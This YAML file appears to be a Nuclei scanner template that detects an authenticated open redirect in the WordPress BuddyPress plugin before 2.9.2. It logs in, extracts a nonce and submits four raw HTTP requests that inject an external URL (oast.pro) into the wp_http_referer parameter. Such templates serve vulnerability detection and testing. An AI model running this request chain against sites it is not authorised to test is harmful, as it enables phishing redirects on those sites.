id: wp-buddypress-open-redirect

info:
  name: WordPress BuddyPress < 2.9.2 - Authenticated Open Redirect
  author: 0x_Akoko
  severity: medium
  description: |
    WordPress BuddyPress plugin before 2.9.2 contains an authenticated open redirect vulnerability via the wp_http_referer parameter on the bp-profile-edit admin page. After updating profile, the Back to Users link redirects to the attacker-specified URL.
  reference:
    - https://hackerone.com/reports/277502
    - https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cwe-id: CWE-601
  metadata:
    verified: true
    max-request: 4
  tags: wordpress,wp-plugin,buddypress,redirect,authenticated

flow: http(1) && http(2) && http(3) && http(4)

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

    matchers:
      - type: dsl
        dsl:
          - status_code == 302
          - contains(header, "wordpress_logged_in")
        condition: and
        internal: true

  - raw:
      - |
        GET /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '_wpnonce')
        condition: and
        internal: true

    extractors:
      - type: regex
        name: nonce
        group: 1
        internal: true
        regex:
          - 'id="_wpnonce" name="_wpnonce" value="([a-f0-9]+)"'

  - raw:
      - |
        POST /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&action=update HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        save=Update+Profile&field_ids%5B%5D=1&field_1=admin&_wpnonce={{nonce}}&_wp_http_referer=%2Fwp-admin%2Fusers.php%3Fpage%3Dbp-profile-edit%26wp_http_referer%3Dhttps%253A%252F%252Foast.pro

    matchers:
      - type: dsl
        dsl:
          - status_code == 302
          - contains(header, 'wp_http_referer=https')
        condition: and
        internal: true

  - raw:
      - |
        GET /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&updated=1 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "href=\"https://oast.pro\"")
          - contains(body, "Back to Users")
        condition: and
